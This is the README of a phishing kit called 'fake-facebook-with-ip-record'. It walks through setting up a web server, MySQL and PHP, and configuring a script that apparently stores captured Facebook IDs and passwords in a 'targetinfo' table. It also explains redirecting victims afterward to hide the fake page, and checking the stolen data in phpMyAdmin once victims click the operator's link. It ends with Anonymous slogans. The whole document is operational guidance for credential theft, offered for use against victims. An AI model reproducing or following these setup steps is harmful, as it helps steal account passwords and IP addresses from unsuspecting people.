﻿# fake-facebook-with-ip-record
Install
1. Setup Your Webserver Apache or Nginx Whaterver
2. Setup and Install MySQL-Server
3. Setup your PHP up to 5.0
4. Install phpmyadmin (recommand for your sql query by web)

Configure
1. Create DB with your MySQL-Server
2. go to facebook->fbidpwinsert.php and change you DB info
    $dbhost = 'localhost';
    $dbname = 'facebook_info';
    $dbtable = 'targetinfo';
    $dbuname = 'root';
    $dbpwd = 'your_password';
3. In the same file after the "mysqli_colse($conn);"
   You can see the $URL method to the jump page correct what the page you wanna go.... 
   You can also jump to the different page to fake the target
   
4. Check Data with your phpmyadmin as victim access by your link

You can development more with the PHP code and your function in the index.php
Don't try to ask why victim don't click your link
You should make it your own

We are Legion
We Do Not Forget
We Do Not Forgive
Expect Us
